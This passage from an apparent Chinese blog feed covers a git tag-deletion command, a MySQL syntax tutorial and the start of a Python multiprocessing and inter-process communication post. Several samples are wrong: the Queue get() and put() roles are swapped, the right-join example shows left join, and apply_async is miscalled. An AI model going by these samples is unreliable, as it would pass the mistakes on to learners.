<p>删除远程仓库中的标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin :refs/tags/标签名</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之基础语法</title>
    <url>/2018/03/31/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<p>在 MySQL 中，表、视图、存储过程和索引等具体存储数据或对数据进行操作的实体都被称为数据库对象。</p>
<ul>
<li>表：是包含数据库中所有数据的数据库对象，由行和列组成，用于组织和存储数据类型</li>
<li>字段：表中每列被称为一个字段，字段具有自己的属性，如字段类型、字段大小等。其中，字段类型是字段最重要的属性，它决定了字段能存储哪种数据。</li>
<li>索引：是一个单独的、物理的数据结构。它是依赖于表建立的，在数据库中索引使用数据库程序无需对整个表进行扫描就可以在其中找到所需的数据。索引可以比作是一本书的目录</li>
<li>视图：视图是从一张或多张表中导出的表（也称虚拟表），是用户查看数据的一种方式，表中包括几个被定义的数据列与数据行，其结构和数据建立在对表的查询基础之上。</li>
<li>存储过程：一组为了完成特定功能的 SQL 语句集合（包括查询、插入、删除、更新等操作），经编译后以名称的形式存储在 SQL Server 服务端的数据库中，由用户通过指定存储过程的名字来执行对应的存储操作。</li>
</ul>
<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p>存储引擎其实就是如何在存储数据，如何为存储的数据建立索引和如何更新、查询数据等技术的实现方法。MySQL 支持很多表，每种类型都有自己的特定作用、优点和缺点。MySQL 还相应提供了很多不同的存储引擎，可以以最适合于应用需求的方式存储数据。</p>
<p>MySQL中的数据用各种不同的技术存储在文件或内存中，这些技术采用不同的存储机制、索引技巧、锁定水平并最终提供广泛的、不同的功能和能力。通过选择不同的技术，能够获取额外的速度或者功能，从而改善应用的整体功能。</p>
<p>查询当前数据库的引擎：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%storage_engine%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="InnoDB引擎"><a href="#InnoDB引擎" class="headerlink" title="InnoDB引擎"></a>InnoDB引擎</h3><p>InnoDB 支持自动增长列：<code>AUTO_INCREMENT</code>。自动增长列的值不能为空，且值必须唯一。<strong>MySQL中规定自动增长列必须为主键</strong>，在插入值时，如果自动增长列不输入值或插入的值为0、null，则插入的值为自动增长后的值。</p>
<p>InnoDB支持外键（foreign key）。外键所在表为子表，外键所依赖的表为父表。<strong>父表中被子表外键关联的字段必须为主键</strong>。当修改父表的某天信息时，子表也必须有相应的改变。</p>
<p>InnoDB是如下情况的理想引擎：  </p>
<ol>
<li>更新密集的表。InnnoDB特别适合处理多重并发的更新请求</li>
<li>事务。InnoDB是唯一支持事务的标志MySQL存储引擎。在管理敏感数据（如用户注册）时特别有用</li>
<li>自动灾难修复。与其他引擎不同，InnoDB能自动从灾难中恢复，虽然MyISAM也能做到但是其过程要长得多</li>
</ol>
<h3 id="MyISAM引擎"><a href="#MyISAM引擎" class="headerlink" title="MyISAM引擎"></a>MyISAM引擎</h3><p>MyISAM 引擎的优点在于占用空间小，处理速度快；缺点是不支持事务的完整性和并发性。</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>MySQL支持5中基本字段类型：数值型，字符型，文本型，逻辑型和日期时间型。</p>
<ul>
<li>数值型：MySQL 支持所有标准 SQL 数值数据类型。这些数值类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。<br>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</li>
</ul>
<p><img src="http://ke.dajiangtai.com/content/411/1.png" alt="整数型"></p>
<p><img src="http://ke.dajiangtai.com/content/411/2.png" alt="浮点型"></p>
<ul>
<li>时间日期型：表示时间值的日期和时间类型为 DATETIME、DATE、TIMESTAMP、TIME 和 YEAR。每个时间类型有一个有效值范围和一个零值，当指定非法值时使用”零”值。</li>
</ul>
<p><strong>TIMESTAMP 类型有专有的自动更新特性。</strong></p>
<p><img src="http://ke.dajiangtai.com/content/411/3.png" alt="时间日期类型"></p>
<ul>
<li>字符串型：字符串类型指 CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。</li>
</ul>
<p><img src="http://ke.dajiangtai.com/content/411/4.png" alt="字符串类型"></p>
<p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p>
<p>创建表时，使用字符串类型时应遵循以下原则：  </p>
<ol>
<li>从速度方面考虑，要选择固定长度的列，可以使用 CHAR 类型</li>
<li>要节省空间，使用动态长度的列，可以使用 VARCHAR 类型</li>
<li>要将列中的内容限制在一种选择，可以用 ENUM 类型</li>
<li>允许一个列中有多于一个的条目，可以用 SET 类型</li>
</ol>
<ul>
<li>布尔型：其实 MySQL 里根本没有布尔型，虽然可以用 <code>boolean</code> 但实际上 MySQL 会把它替换成 <code>tinyint(1)</code>。用 1 或 True 表示真，0 或 False 表示假。</li>
</ul>
<h2 id="SQL-语句入门"><a href="#SQL-语句入门" class="headerlink" title="SQL 语句入门"></a>SQL 语句入门</h2><p>使用数据库，首先要会 SQL 语句。下列 SQL 语句中，带 <code>&#123;&#125;</code> 的是必选项，<code>[]</code> 是可选项，<code>[default]</code> 表示可选并有默认值的选项，<code>|</code> 表示或。SQL 语句以 <code>;</code> 结尾，也可以用 <code>\g</code> 或 <code>\G</code>，<code>\g</code> 与 <code>;</code> 是相同的，而 <code>\G</code> 可以让结果显示更美观。</p>
<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database [if <span class="keyword">not</span> <span class="keyword">exists</span>] 数据库名</span><br><span class="line">[<span class="keyword">default</span>]<span class="type">character</span> <span class="keyword">set</span> [<span class="operator">=</span>] 字符集名;</span><br></pre></td></tr></table></figure>

<p><code>character set</code> 默认情况下是 MySQL 服务器配置文件里的字符集。可以是GB2312 或 GBK（简体中文）、UTF8、BIG5（繁体中文）、Latin1（拉丁文）等，最常见的就是 GBK 和 UTF8。</p>
<h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> database [<span class="keyword">like</span> <span class="string">&#x27;模式&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>查看所有数据库，谓词 <code>like</code> 用于指定匹配模式（支持正则）。如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> database <span class="keyword">like</span> <span class="string">&#x27;db%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use 数据库名;</span><br></pre></td></tr></table></figure>

<p>使用 <code>use</code> 语句将数据库指定为当前数据库后，当前数据库在当前工作会话关闭（即断开与该数据库的连接）或再次使用 <code>use</code> 语句指定数据库时结束工作状态。</p>
<h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> database [if <span class="keyword">exists</span>] 数据库名;</span><br></pre></td></tr></table></figure>

<p><code>if exists</code> 在删除数据库前先判断数据库是否已经存在，只有已经存在是才会执行删除操作，这样可以避免删除不存在的数据库时产生异常。</p>
<h3 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [temporary] <span class="keyword">table</span> [if <span class="keyword">not</span> <span class="keyword">exists</span>] 数据表名</span><br><span class="line">(&#123;create_defination[,create_defination]&#125;) [table_options] [select_statement];</span><br></pre></td></tr></table></figure>

<p>说明：  </p>
<ol>
<li>temporary：创建一个临时表</li>
<li>if not exists：避免表存在时出错</li>
<li>create_defination：定义表的列属性</li>
<li>table_options：表的一些特性参数，涉及表数据如何存储。如engine选项：engine=MyISAM。</li>
<li>select_statement：select语句描述部分，用它可以快速创建表</li>
</ol>
<p>create_defination格式：</p>
<blockquote>
<p>col_name type [not null | null] [default default_value] [auto_increment] [primary key] [reference_defination]</p>
</blockquote>
<p>下面是例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test (</span><br><span class="line">    id tinyint <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">describe</span> 数据表名 [列名];</span><br></pre></td></tr></table></figure>

<h3 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h3><p>修改表结构指增加或删除字段、修改字段名称或字段类型、设置取消主键外键、设置取消索引等</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 数据表名 alter_spec[,alter_spec] <span class="operator">|</span> table_options</span><br></pre></td></tr></table></figure>

<p>alter_spec:  </p>
<ul>
<li>add create_defination[first | after column_name] //添加新字段</li>
<li>add index [index_name] (index_col_name) //添加索引名称</li>
<li>add primary key (index_col_name) //添加主键名称</li>
<li>add unique [index_name] (index_col_name) //添加唯一索引</li>
<li>alter col_name {set default 默认值 | drop default} //修改字段默认值</li>
<li>change old_col_name create_defination //修改字段名、类型</li>
<li>modify col_name create_defination //修改字段定义</li>
<li>drop col_name //删除字段</li>
<li>drop index index_name //删除索引</li>
<li>rename as new_tab_name //修改表名</li>
</ul>
<p><strong><code>alter table</code> 语句允许指定多个动作，其动作间用逗号分隔，每个动作表示一个修改。</strong></p>
<ul>
<li>添加新字段及修改字段定义：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">add</span> email <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> after location,</span><br><span class="line">modify name <span class="type">char</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>修改字段名：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users change <span class="keyword">user</span> username varhcar(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除字段：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">drop</span> email;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改表名：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users rename the_users;</span><br></pre></td></tr></table></figure>

<h3 id="复制表"><a href="#复制表" class="headerlink" title="复制表"></a>复制表</h3><p>在一张已存在的数据表的基础上创建一份该表的备份，也就是复制表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [if <span class="keyword">not</span> <span class="keyword">exists</span>] 数据表名 <span class="keyword">like</span> 源数据表名;</span><br></pre></td></tr></table></figure>

<p>使用该语法复制数据表时，将创建一个与源数据表相同结构的新表，该数据表的别名、数据类型和索引都将被复制，但是表的内容是不会被复制的。因此，创建的表是一张<strong>空表</strong>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">user</span> <span class="keyword">like</span> the_users;</span><br></pre></td></tr></table></figure>

<p>如果在复制表格式的同时也想复制表中的内容，可以使用<code>as</code>（查询表达式）字句实现：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">user</span> <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> the_users;</span><br></pre></td></tr></table></figure>

<h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> [if <span class="keyword">exists</span>] 数据表名;</span><br></pre></td></tr></table></figure>

<p>可同时删除多张表，多个表之间用逗号<code>,</code>连接。</p>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> [low_priority <span class="operator">|</span> delayed <span class="operator">|</span> high_priority] [ignore]</span><br><span class="line">[<span class="keyword">into</span>] 数据表名 [(字段名)] <span class="keyword">values</span> (&#123;值 <span class="operator">|</span> <span class="keyword">default</span>&#125;),(...),...</span><br></pre></td></tr></table></figure>

<ul>
<li><p>[low_priority | delayed | high_priority]：<code>low_priority</code> 是 <code>insert</code>、<code>delete</code>、<code>update</code> 都可选的操作，降低 <code>insert</code>、<code>delete</code>、<code>update</code> 的优先级。<code>delayed</code> 是 <code>insert</code> 语句支持的一种可选修饰符，用于指定MySQL服务器把待插入的行数据放在一个缓冲器中，直到待插数据的表空闲时，才真正的在表中插入数据行。<code>high_priority</code> 是 <code>insert</code>和 <code>select</code> 语句支持的一种可选修饰符，用于指定 <code>insert</code> 和 <code>select</code> 操作优先执行。</p>
</li>
<li><p>[ignore]： 在执行 <code>insert</code> 语句时，所出现的错误都会被当做警告</p>
</li>
<li><p>[into]： 指定被操作的数据表</p>
</li>
<li><p>[(字段名,…)]： 当不指定该选项时，表示要向表中所有列插入数据，否则表示向数据表的指定列插入数据。</p>
</li>
<li><p>({值 | default}),(…),…：用于指定需要插入的数据清单，其<strong>顺序必须与字段的顺序相对应</strong>。其中的每一列的数据可以是一个变量、常量、表达式或者null。但是其<strong>数据类型要与对应的字段类型相匹配</strong>；也可以使用 <code>default</code> 关键字，表示为该列插入默认值，但是前提是已经明确指定了默认值，否则会出错。</p>
</li>
<li><p>插入完整数据：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;qiuyue&#x27;</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>插入数据记录的一部分：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (name, age) <span class="keyword">values</span> (<span class="string">&#x27;qiuyue&#x27;</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>插入查询结果：MySQL 支持将查询结果插入到数据表中</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 数据表名[(字段名,...)] <span class="keyword">select</span> ...;</span><br></pre></td></tr></table></figure>

<p><strong>select 字句返回的结果集中的字段数量、字段类型必须与目标数据表完全一致。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (username,age) <span class="keyword">select</span> username,age <span class="keyword">from</span> students;</span><br></pre></td></tr></table></figure>

<h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update 数据表名</span><br><span class="line"><span class="keyword">set</span> 字段<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>[,字段<span class="number">2</span><span class="operator">=</span>值<span class="number">2</span> ...]</span><br><span class="line">[<span class="keyword">where</span> 条件表达式] [<span class="keyword">order</span> by...] [limit 行数]</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update users <span class="keyword">set</span> username <span class="operator">=</span> <span class="string">&#x27;qiuyue&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 数据表名</span><br><span class="line">[<span class="keyword">where</span> 条件表达式] [<span class="keyword">order</span> by...] [limit 行数];</span><br></pre></td></tr></table></figure>

<p><strong>如果没有指定 <code>where</code> 条件，将删除所有记录</strong>。  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>如果要删除所有行，还可以使用 <code>truncate table</code> 语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">truncate</span> [<span class="keyword">table</span>] 数据表名</span><br></pre></td></tr></table></figure>

<p><code>truncate</code> 会<strong>删除数据表中所有数据且无法恢复</strong>。<br><code>delete</code> 与 <code>truncate</code> 区别如下：</p>
<ol>
<li>使用 <code>truncate</code> 语句会重新设置 <code>auto_increment</code> 计数器的初始值</li>
<li>对于参与了索引和视图的表不能使用 <code>truncate</code> 语句</li>
<li><code>truncate</code> 比 <code>delete</code> 使用的系统和事物资源少。每删除一条记录 <code>delete</code> 语句都会添加一条日志，而 <code>truncate</code> 只在事物日志中记录页的释放。</li>
</ol>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> selection_list</span><br><span class="line"><span class="keyword">from</span> 数据表名</span><br><span class="line"><span class="keyword">where</span> primary_constraint</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> sroting_cloumns </span><br><span class="line"><span class="keyword">having</span> secondary_constraint</span><br><span class="line">limit count </span><br></pre></td></tr></table></figure>

<ul>
<li>查询一张表的一列或多列：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users; <span class="operator">/</span><span class="operator">/</span>查询users表所有内容</span><br><span class="line"><span class="keyword">select</span> id,age <span class="keyword">from</span> users; <span class="operator">/</span><span class="operator">/</span>查询users表id列和age列所有内容</span><br></pre></td></tr></table></figure>

<ul>
<li>从多个表中获取数据：</li>
</ul>
<p>使用 <code>select</code> 语句进行多表查询，需要确定所查询的数据在哪个表中，多个表之间用 <code>,</code>分隔：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> users.id, users.name, student.id, student.name</span><br><span class="line"><span class="keyword">from</span> users, student;</span><br></pre></td></tr></table></figure>

<p>还可以在 <code>where</code> 子句中用连接符 <code>=</code> 来确定表之间的联系。然后根据这个条件返回查询结果：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> users.name,student.location <span class="keyword">from</span> users,studnet <span class="keyword">where</span> users.id<span class="operator">=</span>student.id <span class="keyword">and</span> users.id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><code>users.id=student.id</code> 表示将 users 和 student 两张表根据 <code>users.id=stduent.id</code> 的条件连接起来，叫做等同连接。如果不使用 <code>users.id=stduent.id</code> 那么产生的结果是两张表的笛卡尔积，叫全连接。</p>
<ul>
<li>带关键字 in 的查询：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 [<span class="keyword">not</span>] <span class="keyword">in</span> (元素<span class="number">1</span>，元素<span class="number">2</span> ...);</span><br></pre></td></tr></table></figure>

<p>关键字 <code>in</code> 可以判断某个字段的值是否在指定的集合中，如果在该记录会被查询出来：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="keyword">in</span> (<span class="string">&#x27;Mike&#x27;</span>, <span class="string">&#x27;David&#x27;</span>); </span><br></pre></td></tr></table></figure>

<ul>
<li>带关键字between…and…的范围查询：between…and… 是<strong>前闭后闭</strong>的</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">7</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>带like的字符匹配查询：通过 <code>like</code> 可以实现模糊查询，它有两种通配符 <code>%</code> 和 <code>_</code>:<ul>
<li>% 可以匹配 0 个或多个字符，可以代表任意长度的字符串。如 “Mi%ke” 可以匹配Mike，Miosfke等</li>
<li>_ 最多只能匹配一个字符。</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="keyword">like</span> &quot;Jack_a&quot;;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> studnet <span class="keyword">where</span> location <span class="keyword">like</span> &quot;China\_%&quot;;</span><br></pre></td></tr></table></figure>

<ul>
<li>group by 分组查询</li>
</ul>
<p>通过关键字 <code>group by</code> 可以将数据划分到不同的组中，实现对记录的分组查询。常搭配 count(), sum(), avg(), max(), min() 等聚合函数使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> class_id;</span><br><span class="line"><span class="keyword">select</span> class_id, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> class_id;</span><br></pre></td></tr></table></figure>

<h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><p>连接是把不同表的记录连接在一起的最普遍的方法。</p>
<ul>
<li>内连接查询：把不符合连接条件的行从视图中删除，最常见的例子是相等查询：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s.name,s.age,s.class_id,c.name <span class="keyword">as</span> class_name </span><br><span class="line"><span class="keyword">from</span> students <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">join</span> classes <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">on</span> s.class_id <span class="operator">=</span> c.id <span class="keyword">and</span> s.id <span class="operator">&gt;</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>左外连接：返回结果除了内连接的数据外，还包括左表中不符合条件的数据，并在右表相应列加 null 值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 左表名 <span class="keyword">left</span> <span class="keyword">join</span> 右表名 <span class="keyword">on</span> 条件;</span><br></pre></td></tr></table></figure>

<ul>
<li>右外连接：返回结果除了内连接的数据外，还包括右表中不符合条件的数据，并在左表相应列加 null 值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 左表名 <span class="keyword">left</span> <span class="keyword">join</span> 右表名 <span class="keyword">on</span> 条件;</span><br></pre></td></tr></table></figure>

<h1 id="语句执行顺序"><a href="#语句执行顺序" class="headerlink" title="语句执行顺序"></a>语句执行顺序</h1><p>MySQL的语句一共分为11步，如下图所标注的那样，最先执行的总是FROM操作，最后执行的是LIMIT操作。其中每一个操作都会产生一张虚拟的表，这个虚拟的表作为一个处理的输入，只是这些虚拟的表对用户来说是透明的，但是只有最后一个虚拟的表才会被作为结果返回。如果没有在语句中指定某一个子句，那么将会跳过相应的步骤。  </p>
<p><img src="https://i.loli.net/2019/02/24/5c720eb160e17.jpg" alt="执行顺序">  </p>
<p>下面来分析一下这些语句：  </p>
<ol>
<li>FORM: 对FROM的左边的表和右边的表计算笛卡尔积。产生虚表VT1</li>
<li>ON: 对虚表VT1进行ON筛选，只有那些符合 <join-condition> 的行才会被记录在虚表VT2中。</li>
<li>JOIN： 如果指定了OUTER JOIN（比如left join、 right join），那么保留表中未匹配的行就会作为外部行添加到虚拟表VT2中，产生虚拟表VT3,如果from子句中包含两个以上的表的话，那么就会对上一个join连接产生的结果VT3和下一个表重复执行步骤1~3这三个步骤，一直到处理完所有的表为止。</li>
<li>WHERE： 对虚拟表VT3进行WHERE条件过滤。只有符合 <where-condition> 的记录才会被插入到虚拟表VT4中。</li>
<li>GROUP BY: 根据group by子句中的列，对VT4中的记录进行分组操作，产生VT5.</li>
<li>CUBE | ROLLUP: 对表VT5进行cube或者rollup操作，产生表VT6.</li>
<li>HAVING： 对虚拟表VT6应用having过滤，只有符合 <having-condition> 的记录才会被 插入到虚拟表VT7中。</li>
<li>SELECT： 执行select操作，选择指定的列，插入到虚拟表VT8中。</li>
<li> DISTINCT： 对VT8中的记录进行去重。产生虚拟表VT9.</li>
<li>ORDER BY: 将虚拟表VT9中的记录按照 <order_by_list> 进行排序操作，产生虚拟表VT10.</li>
<li>LIMIT：取出指定行的记录，产生虚拟表VT11, 并将结果返回。  </li>
</ol>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>进程间通信——以Python为例</title>
    <url>/2018/01/09/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>需要创建多个进程时，可以使用 multiprocessing 中的 Pool 类开进程池。Pool() 默认开启数量等于当前 cpu 核心数的子进程（当然可以手动改变）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello ,this is the %d process&quot;</span> % i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        p.apply_async(target=hell0,args=(i,))</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>apply_async 表示在开进程时不阻塞主进程，是异步 IO 的一种方式之一。targe 参数传入要在子线程中执行的<strong>函数对象</strong>，args以元组的方式传入函数的参数。<br>join() 会等待线程池中的每一个线程执行完毕，在 join() 之前必须要先 close()，close() 表示不能再向线程池中添加新的 process 了。</p>
<h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><p>每个进程各自有不同的用户地址空间,任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核,在内核中开辟一块缓冲区,进程A把数据从用户空间拷到内核缓冲区,进程B再从内核缓冲区把数据读走,内核提供的这种机制称为进程间通信。假如创建了多个进程，那么进程间的通信是必不可少的。Python 提供了多种进程通信的方式，其中以 Queue 和 Pipe 用得最多。下面分别介绍这两种模式。</p>
<h3 id="共享内存通信"><a href="#共享内存通信" class="headerlink" title="共享内存通信"></a>共享内存通信</h3><p>让操作系统维持一块共享内存，所有要互相通信的进程通过这块内存交换信息。这样做的缺点是要格外注意数据同步问题。</p>
<p>下面以 Python 中 Queue 为例子做一个示范。Queue 是一种多进程安全的队列，其实现多进程间的通信有两种方法：</p>
<ul>
<li>get() 用于向队列中加入数据。有两个属性：blocked 和 timeout。blocked 为 true 时（默认为True）且 timeout 为正值时，如果当队列已满会阻塞 timeout 时间，在这个时间内如果队列有空位会加入，如果超过时间仍然没有空位会抛出 Queue.Full 异常。</li>
<li>put() 用于从队列中获取一个数据并将其从队列中删除。有两个属性：blocked 和timeout。blocked 为 true（默认为True）且 timeout 为正值时，如果当前队列为空会阻塞 timeout 时间，在这个时间内如果队列有新数据会获取，如果超过时间仍然没有新数据会抛出 Queue.Empty 异常。</li>
</ul>
